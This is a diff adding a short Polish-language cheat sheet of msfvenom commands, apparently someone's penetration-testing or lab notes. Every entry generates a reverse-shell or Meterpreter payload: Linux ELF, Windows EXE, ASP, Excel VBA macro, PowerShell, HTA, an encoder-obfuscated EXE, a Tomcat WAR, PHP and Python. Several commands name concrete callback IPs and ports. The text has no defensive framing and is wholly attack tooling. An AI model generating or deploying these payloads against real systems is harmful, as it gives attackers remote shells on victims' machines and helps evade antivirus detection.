@@ -1,0 +1,38 @@
+1) [LINUX]Generowanie programow[LINUX]
+      • Rivershell jako program
+            ▪ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o <name.elf>
+      • Rivershell jako wykonanie komendy
+            ▪ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o <name.elf>
+      • Generowanie polecenia (R - w surowym stanie)
+            ▪ msfvenom -p cmd/unix/reverse_netcat lhost=<ip> lport=<port> R
+
+2) [WINDOWS]Generowanie programow[WINDOWS]
+      • Rivershell jako program
+            ▪ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > <file.exe>
+      • [ASP] 
+            ▪ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > <file.asp>
+      • [VBA] (Excel)
+            ▪ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f vba-exe -o <file>
+      • Powershell comand
+            ▪ msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=<ip> LPORT=<port> -f ps1 -o <file.ps1> --platform windows -a cmd
+      • Rivershell ZAKODOWANY
+            ▪ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.72.18 LPORT=4445 -f exe -o shell.exe
+      • Rivershell do netcata
+            ▪ msfvenom -p windows/shell_reverse_tcp lhost=10.11.72.18 lport=8888 -f exe -o shell.exe
+      • ActiveX
+            ▪ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
+      • Java (uzyta przy apache/tomcat)
+            ▪ msvfenom -p java/jsp_shell_reverse_tcp LHOST=10.8.190.238 LPORT=4444 -f war > shell.war
+      • Kod po http + polaczenie multihandler
+            ▪ msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port> -f exe -o prog.exe
+            ▪ set payload windows/meterpreter/reverse_https
+
+3) SERVER
+      • [PHP] od w stanie surowym wymaga (<?php ?>)
+            ▪ msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > <file.php>
+      • [Python]
+            ▪ msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw > <file.py>
+
+
+
+
